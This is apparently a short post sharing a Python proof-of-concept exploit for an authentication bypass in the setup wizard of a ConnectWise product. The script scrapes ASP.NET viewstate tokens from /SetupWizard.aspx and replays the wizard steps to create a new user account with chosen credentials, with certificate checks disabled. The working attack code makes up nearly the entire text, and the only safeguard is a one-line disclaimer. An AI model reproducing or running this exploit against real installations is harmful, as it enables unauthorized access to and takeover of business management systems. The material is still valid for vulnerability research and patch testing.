>[!note] I do not take credit for this, I am simply posting a proof of concept for the exploit. All credits go to the researcher who discovered the vulnerability.

Proof of Concept:


```python
import requests
import re

url = "https://localhost"
username = ""
password = ""

## WRITTEN BY ORACLE-SECURITY - https://github.com/oracle-security
## This is a proof of concept exploit for the ConnectWise Manage 2024.2.21 vulnerability.
## This exploit will create a new user with the provided username and password.
## Please dont do bad things with this

requests.urllib3.disable_warnings()


initial_request = requests.get(url=url+"/SetupWizard.aspx/", verify=False)

viewstate_pattern = re.compile(r'value="([^"]+)"')
viewgen_pattern = re.compile(r'VIEWSTATEGENERATOR" value="([^"]+)"')

viewstate_1 = viewstate_pattern.search(initial_request.text).group(1)
viewgen_1 = viewgen_pattern.search(initial_request.text).group(1)

next_data = {
    "__EVENTTARGET": '',
    "__EVENTARGUMENT": '',
    "__VIEWSTATE": viewstate_1,
    "__VIEWSTATEGENERATOR": viewgen_1,
    "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"
}
next_request = requests.post(url=url+"/SetupWizard.aspx/", data=next_data, verify=False)

viewstate_2 = viewstate_pattern.search(next_request.text).group(1)
viewgen_2 = viewgen_pattern.search(next_request.text).group(1)

exploit_data = {
    "__LASTFOCUS": '',
    "__EVENTTARGET": '',
    "__EVENTARGUMENT": '',
    "__VIEWSTATE": viewstate_2,
    "__VIEWSTATEGENERATOR": viewgen_2,
    "ctl00$Main$wizard$userNameBox": username,
    "ctl00$Main$wizard$emailBox": username+"@poc.com",
    "ctl00$Main$wizard$passwordBox": password,
    "ctl00$Main$wizard$verifyPasswordBox": password,
    "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"
}

exploit_request = requests.post(url=url+"/SetupWizard.aspx/", data=exploit_data, verify=False)
```